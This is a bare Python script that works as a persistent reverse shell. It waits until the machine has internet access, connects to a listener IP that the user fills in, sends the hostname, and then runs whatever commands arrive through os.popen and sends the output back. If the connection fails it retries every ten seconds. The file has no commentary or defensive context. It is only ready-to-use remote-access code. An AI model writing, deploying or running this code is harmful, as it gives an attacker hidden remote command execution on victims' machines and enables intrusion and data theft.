import socket
import time
import os

IP = 'your_public_ip'   # Replace with your listener's IP
PORT = 5678

def has_internet():
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=2)
        return True
    except:
        return False

while True:
    if has_internet():
        try:
            s = socket.socket()
            s.connect((IP, PORT))
            s.send(f"[+] Connected from: {os.uname()[1]}".encode())
            
            while True:
                command = s.recv(1024).decode()
                if command.lower() in ['exit', 'quit']:
                    break
                output = os.popen(command).read()
                s.send(output.encode() if output else b"[OK]")
            
            s.close()
            break
        except:
            pass
    time.sleep(10)  # Retry every 10 seconds
